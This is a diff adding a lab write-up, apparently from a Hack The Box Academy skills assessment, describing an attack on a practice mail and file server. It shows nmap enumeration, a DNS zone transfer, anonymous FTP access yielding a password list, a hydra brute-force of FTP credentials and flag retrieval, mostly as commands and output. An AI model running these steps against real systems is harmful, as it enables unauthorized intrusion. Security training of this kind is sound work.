@@ -3350,6 +3350,199 @@ PS C:\Users\Administrator\Desktop> cat flag.txt
 <details>
 <summary><h2>Attacking Common Services (MEDIUM)</h2></summary>
 
+The second server is an internal server (within the inlanefreight.htb domain) that manages and stores emails and files and serves as a backup of some of the company's processes. From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.
+
+<details>
+<summary><h3>2. Enumeration</h3></summary>
+
+I started enumerating the ports, their service version and running the default scripts to have a big picture of my target machine.
+
+```bash 
+nmap -p- -sC -sV -Pn 10.129.157.24
+```
+```bash 
+# Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-22 20:42 CDT
+# Nmap scan report for 10.129.157.24
+# Host is up (0.067s latency).
+# Not shown: 65529 closed tcp ports (reset)
+# PORT      STATE SERVICE  VERSION
+# 22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+# | ssh-hostkey: 
+# |   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
+# |   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
+# |_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
+# 53/tcp    open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
+# | dns-nsid: 
+# |_  bind.version: 9.16.1-Ubuntu
+# 110/tcp   open  pop3     Dovecot pop3d
+# |_ssl-date: TLS randomness does not represent time
+# | ssl-cert: Subject: commonName=ubuntu
+# | Subject Alternative Name: DNS:ubuntu
+# | Not valid before: 2022-04-11T16:38:55
+# |_Not valid after:  2032-04-08T16:38:55
+# |_pop3-capabilities: SASL(PLAIN) RESP-CODES AUTH-RESP-CODE PIPELINING CAPA TOP UIDL USER STLS
+# 995/tcp   open  ssl/pop3 Dovecot pop3d
+# | ssl-cert: Subject: commonName=ubuntu
+# | Subject Alternative Name: DNS:ubuntu
+# | Not valid before: 2022-04-11T16:38:55
+# |_Not valid after:  2032-04-08T16:38:55
+# |_ssl-date: TLS randomness does not represent time
+# |_pop3-capabilities: TOP SASL(PLAIN) UIDL RESP-CODES USER AUTH-RESP-CODE PIPELINING CAPA
+# 2121/tcp  open  ftp
+# | fingerprint-strings: 
+# |   GenericLines: 
+# |     220 ProFTPD Server (InlaneFTP) [10.129.157.24]
+# |     Invalid command: try being more creative
+# |     Invalid command: try being more creative
+# |   NULL: 
+# |_    220 ProFTPD Server (InlaneFTP) [10.129.157.24]
+# 30021/tcp open  ftp
+# | fingerprint-strings: 
+# |   GenericLines: 
+# |     220 ProFTPD Server (Internal FTP) [10.129.157.24]
+# |     Invalid command: try being more creative
+# |     Invalid command: try being more creative
+# |   NULL: 
+# |_    220 ProFTPD Server (Internal FTP) [10.129.157.24]
+```
+
+```bash 
+dig AXFR @10.129.157.24 inlanefreight.htb
+```
+```bash 
+# ; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> AXFR @10.129.157.24 inlanefreight.htb
+# ; (1 server found)
+# ;; global options: +cmd
+# inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
+# inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
+# app.inlanefreight.htb.	604800	IN	A	10.129.200.5
+# dc1.inlanefreight.htb.	604800	IN	A	10.129.100.10
+# dc2.inlanefreight.htb.	604800	IN	A	10.129.200.10
+# int-ftp.inlanefreight.htb. 604800 IN	A	127.0.0.1
+# int-nfs.inlanefreight.htb. 604800 IN	A	10.129.200.70
+# ns.inlanefreight.htb.	604800	IN	A	127.0.0.1
+# un.inlanefreight.htb.	604800	IN	A	10.129.200.142
+# ws1.inlanefreight.htb.	604800	IN	A	10.129.200.101
+# ws2.inlanefreight.htb.	604800	IN	A	10.129.200.102
+# wsus.inlanefreight.htb.	604800	IN	A	10.129.200.80
+# inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
+# ;; Query time: 66 msec
+# ;; SERVER: 10.129.157.24#53(10.129.157.24) (TCP)
+# ;; WHEN: Mon Sep 22 20:53:29 CDT 2025
+# ;; XFR size: 13 records (messages 1, bytes 372)
+```
+
+```bash 
+ftp 10.129.157.24 30021
+```
+```bash 
+# Connected to 10.129.157.24.
+# 220 ProFTPD Server (Internal FTP) [10.129.157.24]
+Name (10.129.157.24:root): anonymous
+# 331 Anonymous login ok, send your complete email address as your password
+Password: 
+# 230 Anonymous access granted, restrictions apply
+# Remote system type is UNIX.
+# Using binary mode to transfer files.
+ftp> passive
+# Passive mode: off; fallback to active mode: off.
+ftp> dir
+# 200 EPRT command successful
+# 150 Opening ASCII mode data connection for file list
+# drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 <USER>
+# 226 Transfer complete
+ftp> cd <USER>
+# 250 CWD command successful
+ftp> dir
+# 200 EPRT command successful
+# 150 Opening ASCII mode data connection for file list
+# -rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
+# 226 Transfer complete
+ftp> get mynotes.txt
+# local: mynotes.txt remote: mynotes.txt
+# 200 EPRT command successful
+# 150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
+# 100% |*************************************************************************************************|   153       52.83 KiB/s    00:00 ETA
+# 226 Transfer complete
+# 153 bytes received in 00:00 (2.09 KiB/s)
+ftp> exit
+# 221 Goodbye.
+```
+
+```bash 
+cat mynotes.txt 
+```
+```bash 
+# <PASSWORD1>
+# <PASSWORD2>
+# <PASSWORD3>
+# <PASSWORD4>
+# <PASSWORD5>
+# <PASSWORD6>
+# <PASSWORD7>
+# <PASSWORD8>
+```
+
+```bash 
+hydra -l <USER> -P ./mynotes.txt ftp://10.129.157.24:2121/ -vV
+```
+```bash 
+# Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+# Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-22 21:05:13
+# [DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
+# [DATA] attacking ftp://10.129.157.24:2121/
+# [VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+# [ATTEMPT] target 10.129.157.24 - login "<USER>" - pass "<PASSWORD1>" - 1 of 8 [child 0] (0/0)
+# [ATTEMPT] target 10.129.157.24 - login "<USER>" - pass "<PASSWORD2>" - 2 of 8 [child 1] (0/0)
+# [ATTEMPT] target 10.129.157.24 - login "<USER>" - pass "<PASSWORD3>" - 3 of 8 [child 2] (0/0)
+# [ATTEMPT] target 10.129.157.24 - login "<USER>" - pass "<PASSWORD1>" - 4 of 8 [child 3] (0/0)
+# [ATTEMPT] target 10.129.157.24 - login "<USER>" - pass "<PASSWORD5>" - 5 of 8 [child 4] (0/0)
+# [ATTEMPT] target 10.129.157.24 - login "<USER>" - pass "<PASSWORD6>" - 6 of 8 [child 5] (0/0)
+# [ATTEMPT] target 10.129.157.24 - login "<USER>" - pass "<PASSWORD7>" - 7 of 8 [child 6] (0/0)
+# [ATTEMPT] target 10.129.157.24 - login "<USER>" - pass "<PASSWORD8>" - 8 of 8 [child 7] (0/0)
+# [2121][ftp] host: 10.129.157.24   login: <USER>   password: <PASSWORD6>
+# [STATUS] attack finished for 10.129.157.24 (waiting for children to complete tests)
+# 1 of 1 target successfully completed, 1 valid password found
+# Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-22 21:05:23
+```
+
+```bash 
+ftp 10.129.157.24 2121
+```
+```bash 
+# Connected to 10.129.157.24.
+# 220 ProFTPD Server (InlaneFTP) [10.129.157.24]
+Name (10.129.157.24:root): "<USER>"
+# 331 Password required for <USER>
+Password: 
+# 230 User <USER> logged in
+# Remote system type is UNIX.
+# Using binary mode to transfer files.
+ftp> dir
+# 229 Entering Extended Passive Mode (|||42377|)
+# 150 Opening ASCII mode data connection for file list
+# -rw-r--r--   1 root     root           29 Apr 20  2022 flag.txt
+# drwxrwxr-x   3 <USER>    <USER>        4096 Apr 18  2022 Maildir
+# 226 Transfer complete
+ftp> get flag.txt
+# local: flag.txt remote: flag.txt
+# 229 Entering Extended Passive Mode (|||1522|)
+# 150 Opening BINARY mode data connection for flag.txt (29 bytes)
+#     29       13.50 KiB/s 
+# 226 Transfer complete
+# 29 bytes received in 00:00 (0.41 KiB/s)
+ftp> exit
+# 221 Goodbye.
+```
+
+```bash 
+cat flag.txt
+# <FLAG>
+```
+
+</details>
+
 </details>
 
 <details>
